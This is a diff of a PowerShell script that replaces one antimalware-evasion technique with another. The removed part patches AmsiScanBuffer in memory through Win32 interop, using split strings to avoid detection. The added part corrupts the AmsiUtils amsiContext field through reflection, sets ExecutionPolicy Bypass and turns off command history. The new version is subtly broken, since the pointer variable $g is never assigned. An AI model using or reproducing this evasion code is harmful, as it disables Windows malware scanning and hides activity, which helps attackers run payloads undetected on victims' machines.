@@ -1,29 +1,12 @@
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
-
-$Win32 = @"
-
-using System;
-using System.Runtime.InteropServices;
-
-public class Win32 {
-
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string name);
-
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-}
-"@
-
-Add-Type $Win32
-
-$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
-$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
-$AAA = 0
-[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$AAA)
-$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+Set-ExecutionPolicy Bypass -Scope Process -Force
+$a=[Ref].Assembly.GetTypes()
+Foreach($b in $a) {if ($b.Name -like "*iUtils") {$b}}
+Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
+$c.GetFields('NonPublic,Static')
+$d=$c.GetFields('NonPublic,Static')
+Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
+$f.GetValue($null)
+[IntPtr]$ptr=$g
+[Int32[]]$buf=@(0)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
